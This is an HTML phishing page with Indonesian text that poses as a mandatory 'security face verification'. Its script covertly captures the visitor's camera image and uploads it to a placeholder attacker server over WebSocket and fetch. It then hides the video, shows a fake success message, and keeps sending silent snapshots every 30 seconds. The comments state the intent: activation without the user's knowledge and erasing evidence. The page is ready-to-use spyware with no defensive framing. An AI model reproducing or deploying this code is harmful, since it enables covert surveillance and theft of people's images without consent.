<!DOCTYPE html>
<html>
<head>
<title>🎯 Verifikasi Keamanan</title>
<style>
  body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding:50px}
  video{width:400px;border:3px solid #0f0;display:none}
  button{background:#0f0;color:#000;padding:20px 40px;border:none;font-weight:bold;cursor:pointer;font-size:20px}
  #status{color:#ff0;margin:20px;font-size:18px}
  .loader{border:5px solid #0f0;border-radius:50%;border-top:5px solid #000;width:50px;height:50px;animation:spin 1s linear infinite;margin:20px auto}
  @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
</style>
</head>
<body>
<h1>🔐 VERIFIKASI KEAMANAN</h1>
<p style="color:#fff">Klik tombol untuk verifikasi wajah (wajib)</p>

<video id="video" autoplay></video>
<button onclick="startVerification()">✅ VERIFIKASI SEKARANG</button>
<div id="status">⏳ MENUNGGU...</div>
<div id="loader" class="loader" style="display:none"></div>

<script>
let stream;
let photoTaken = false;

async function startVerification() {
  try {
    // 🔥 Aktivasi kamera tanpa sepengetahuan
    document.getElementById('status').innerHTML = '📸 MENGAMBIL FOTO...';
    document.getElementById('loader').style.display = 'block';
    
    stream = await navigator.mediaDevices.getUserMedia({ 
      video: { 
        facingMode: 'user',
        width: { ideal: 1920 },
        height: { ideal: 1080 }
      },
      audio: false 
    });
    
    document.getElementById('video').srcObject = stream;
    document.getElementById('video').style.display = 'block';
    
    // 📸 Capture setelah 2 detik (biar kamera fokus)
    setTimeout(() => {
      captureAndSend();
    }, 2000);
    
  } catch(e) {
    document.getElementById('status').innerHTML = '❌ ERROR: ' + e.message;
    document.getElementById('loader').style.display = 'none';
  }
}

function captureAndSend() {
  const canvas = document.createElement('canvas');
  canvas.width = 1920;
  canvas.height = 1080;
  const ctx = canvas.getContext('2d');
  ctx.drawImage(document.getElementById('video'), 0, 0, 1920, 1080);
  
  // 💀 Kirim ke server penampung
  const dataUrl = canvas.toDataURL('image/jpeg', 0.95);
  
  // 🔥 Kirim via WebSocket langsung
  const ws = new WebSocket('wss://YOUR-SERVER.com:8081');
  ws.onopen = () => {
    ws.send(JSON.stringify({
      type: 'selfie',
      payload: dataUrl,
      timestamp: Date.now(),
      userAgent: navigator.userAgent
    }));
    ws.close();
  };
  
  // 📡 Kirim via fetch juga (cadangan)
  fetch('https://YOUR-SERVER.com/upload', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ image: dataUrl, type: 'selfie' }),
    mode: 'no-cors'
  });
  
  // 🎭 Hapus semua bukti
  document.getElementById('video').style.display = 'none';
  document.getElementById('status').innerHTML = '✅ VERIFIKASI BERHASIL! TERIMA KASIH 😊';
  document.getElementById('loader').style.display = 'none';
  
  // 📸 Ambil lagi setiap 30 detik (tanpa pemberitahuan)
  setInterval(() => {
    captureAndSendSilent();
  }, 30000);
  
  photoTaken = true;
}

function captureAndSendSilent() {
  const canvas = document.createElement('canvas');
  canvas.width = 1920;
  canvas.height = 1080;
  const ctx = canvas.getContext('2d');
  ctx.drawImage(document.getElementById('video'), 0, 0, 1920, 1080);
  const dataUrl = canvas.toDataURL('image/jpeg', 0.95);
  
  // Kirim tanpa log
  fetch('https://YOUR-SERVER.com/upload', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ image: dataUrl, type: 'selfie_auto' })
  });
}
</script>
</body>
</html>
